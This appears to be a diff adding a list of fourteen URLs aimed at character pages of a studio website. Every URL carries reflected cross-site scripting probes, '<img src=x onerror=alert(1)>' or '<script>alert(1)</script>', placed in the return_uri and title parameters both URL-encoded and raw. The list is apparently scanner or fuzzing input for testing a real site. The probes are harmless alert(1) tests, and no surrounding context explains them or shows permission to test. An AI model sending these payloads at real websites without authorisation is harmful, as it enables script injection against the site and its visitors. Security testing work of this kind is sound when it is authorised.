@@ -1,0 +1,14 @@
+https://granitystudios.com/characters/scoop/?return_uri=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E&title=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E-<img src=x onerror=alert(1)>
+https://granitystudios.com/characters/kimberly-spice/?return_uri=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E&title=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E-<img src=x onerror=alert(1)>
+https://granitystudios.com/characters/clark-mayhoff/?return_uri=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E&title=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E-<img src=x onerror=alert(1)>
+https://granitystudios.com/characters/gordon-lockett/?return_uri=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&title=%3Cscript%3Ealert%281%29%3C%2Fscript%3E-<script>alert(1)</script>
+https://granitystudios.com/characters/scoop/?return_uri=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&title=%3Cscript%3Ealert%281%29%3C%2Fscript%3E-<script>alert(1)</script>
+https://granitystudios.com/characters/clark-mayhoff/?return_uri=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&title=%3Cscript%3Ealert%281%29%3C%2Fscript%3E-<script>alert(1)</script>
+https://granitystudios.com/characters/beatrice-b-b-labelle/?return_uri=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E&title=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E-<img src=x onerror=alert(1)>
+https://granitystudios.com/characters/gordon-lockett/?return_uri=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E&title=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E-<img src=x onerror=alert(1)>
+https://granitystudios.com/characters/beatrice-b-b-labelle/?return_uri=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&title=%3Cscript%3Ealert%281%29%3C%2Fscript%3E-<script>alert(1)</script>
+https://granitystudios.com/characters/lilly-sparks/?return_uri=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E&title=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E-<img src=x onerror=alert(1)>
+https://granitystudios.com/characters/kimberly-spice/?return_uri=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&title=%3Cscript%3Ealert%281%29%3C%2Fscript%3E-<script>alert(1)</script>
+https://granitystudios.com/characters/pete-puny-dawson/?return_uri=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E&title=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E-<img src=x onerror=alert(1)>
+https://granitystudios.com/characters/lilly-sparks/?return_uri=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&title=%3Cscript%3Ealert%281%29%3C%2Fscript%3E-<script>alert(1)</script>
+https://granitystudios.com/characters/pete-puny-dawson/?return_uri=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&title=%3Cscript%3Ealert%281%29%3C%2Fscript%3E-<script>alert(1)</script>
